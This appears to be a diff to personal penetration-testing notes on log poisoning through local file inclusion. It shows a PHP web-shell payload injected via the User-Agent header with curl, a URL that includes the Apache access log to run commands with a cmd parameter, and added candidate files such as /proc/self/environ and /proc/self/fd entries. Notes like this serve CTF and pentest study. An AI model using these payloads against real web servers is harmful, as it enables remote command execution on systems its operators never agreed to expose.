@@ -109,8 +109,12 @@ Log poisoning:
   echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
   curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
   http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
+  OR
+  use Burp repreter
 
   more log dir:
+    /proc/self/environ
+    /proc/self/fd/N  (其中 N 是一个通常在 0-50 之间的 PID)
     /var/log/sshd.log
     /var/log/mail
     /var/log/vsftpd.log
